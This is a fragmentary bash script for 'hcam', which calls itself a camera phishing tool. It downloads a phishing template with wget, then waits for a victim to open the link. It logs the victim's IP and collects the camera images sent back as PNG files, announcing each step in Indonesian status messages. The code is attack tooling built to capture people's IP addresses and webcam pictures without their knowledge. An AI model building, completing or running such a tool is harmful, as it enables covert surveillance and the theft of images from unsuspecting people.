...
# Select template
    if echo $option | grep -q "1"; then
        ...
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[hcam]
$red[Version]    ${cyan} :[2.1]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[NINO X CODE]
$red[Github]     ${cyan} :[] 
$red[Join us]    ${cyan} :[]
$red[Telegarm]   ${cyan} :[]"
printf "${cyan}\nNINO${nc}@${cyan}NINO ${red}$ ${nc}"
read about
...
cd $dir
netcheck
wget -q --show-progress "https://github.com/NINO/files/raw/main/${dir}.zip"
...
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target membuka link!\n"
    ...
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Gambar Diterima! Download...\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
